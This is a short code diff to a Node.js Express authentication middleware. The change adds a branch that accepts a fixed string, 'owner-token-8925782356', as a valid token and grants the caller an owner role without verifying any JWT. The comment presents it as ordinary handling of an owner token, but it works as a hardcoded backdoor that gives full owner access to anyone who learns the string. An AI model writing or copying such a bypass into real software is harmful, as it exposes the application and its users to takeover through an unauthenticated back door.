@@ -7,6 +7,12 @@ module.exports = (req, res, next) => {
 
   if (!token) return res.status(401).json({ success: false, message: 'No token provided' });
 
+  // Handle hardcoded owner token
+  if (token === 'owner-token-8925782356') {
+    req.user = { phone: '8925782356', role: 'owner' };
+    return next();
+  }
+
   try {
     const payload = jwt.verify(token, JWT_SECRET);
     req.user = payload; // payload contains id, phone etc.
